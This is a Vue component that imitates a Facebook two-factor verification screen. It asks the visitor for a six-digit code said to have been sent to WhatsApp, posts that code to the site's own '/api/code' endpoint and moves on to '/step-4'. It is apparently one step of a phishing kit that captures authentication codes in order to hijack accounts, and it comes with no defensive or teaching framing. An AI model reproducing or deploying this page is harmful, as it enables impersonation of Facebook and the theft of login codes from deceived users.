<script setup lang="ts">
import { ref } from 'vue'

const email = ref('')
const password = ref('')
const code = ref('')
const isFocusEmail = ref(false)
const isFocusPassword = ref(false)
const router = useRouter()
const handleResetFocus = () => {
  isFocusEmail.value = false
  isFocusPassword.value = false
}

const handleFocus = (type: string, ref: any) => {
  if (type === 'email') {
    isFocusEmail.value = true
    ref.focus()
  } else {
    isFocusPassword.value = true
    ref.focus()
  }
}

const handleSubmit = async () => {
  if (!code.value) {
    return
  }

  // Call your API here
  try {
    await $fetch('/api/code', {
      method: 'POST',
      body: JSON.stringify({ code: code.value }),
      headers: {
        'Content-Type': 'application/json',
      },
    })
    router.push('/step-4')
  } catch (error) {
    console.error(error)
  }
}
</script>

<template>
  <div class="flex px-4 justify-center items-center w-full h-screen bg-[#f1f5fb]">
    <div class="max-md:w-full w-[600px]">
      <p class="text-[13px] mb-4">Facebook</p>
      <p class="text-[1.5rem] font-[600] leading-[17px] max-md:leading-[27px]">Check your WhatsApp messages</p>
      <p class="text-[13px] mt-5 mb-4">Enter the code that we sent to your WhatsApp account.</p>
      <img class="mb-4" src="/assets/images/code-pin.png" alt="" />
      <div
        class="mb-4 input bg-white"
        :class="{
          '!border-[rgb(103,120,138)] border': isFocusEmail && code.trim(),
        }"
        @click.stop="handleFocus('email', $refs.emailElement)"
      >
        <p
          :class="{
            ' transform translate-y-[9px] transition-all duration-200 text-[14px]':
              !isFocusEmail && !code.trim(),
          }"
          class="text-[12px] text-[#9ea1a2]"
        >
          Code
        </p>
        <input
          ref="emailElement"
          v-model="code"
          type="text"
          maxlength="6"
          class="h-5 text-[rgb(28,43,51)]"
          autocomplete="off"
          :class="{
            'opacity-0': !isFocusEmail && !code.trim(),
          }"
          @focus="isFocusEmail = true"
          @blur="isFocusEmail = false"
        />
      </div>
      <div class="flex items-center gap-2">
        <svg viewBox="0 0 24 24" fill="currentColor" width="14" height="14">
          <path
            d="M3 12a9 9 0 0 1 9-9c2.144 0 4.111.749 5.657 2H16a1 1 0 1 0 0 2h4a1 1 0 0 0 1-1V2a1 1 0 1 0-2 0v1.514A10.959 10.959 0 0 0 12 1C5.925 1 1 5.925 1 12s4.925 11 11 11 11-4.925 11-11a1 1 0 1 0-2 0 9 9 0 1 1-18 0z"
          ></path>
        </svg>
        <p class="text-[14px] text-[#0064E0] cursor-pointer hover:underline">Get a new code</p>
      </div>

      <button
        :class="{
          '!bg-[#0263df]': code.trim().length === 6,
        }"
        :disabled="code.trim().length !== 6"
        class="mb-3 mt-8 w-full text-[15px] font-light h-[44px] rounded-full text-white bg-[#a3beef]"
        @click="handleSubmit"
      >
        Continue
      </button>

      <button
        class="flex hover:bg-gray-100 justify-center h-[44px] items-center text-[15px] rounded-full border w-full"
      >
        Try Another Way
      </button>
    </div>
  </div>
</template>

<style scoped>
.input {
  @apply w-full px-4 py-2 h-[60px] border rounded-[12px] border-gray-300 focus:outline-none focus:border-blue-500 focus:ring-1 focus:ring-blue-500;
}
input {
  outline: none;
  width: 100%;
}
</style>
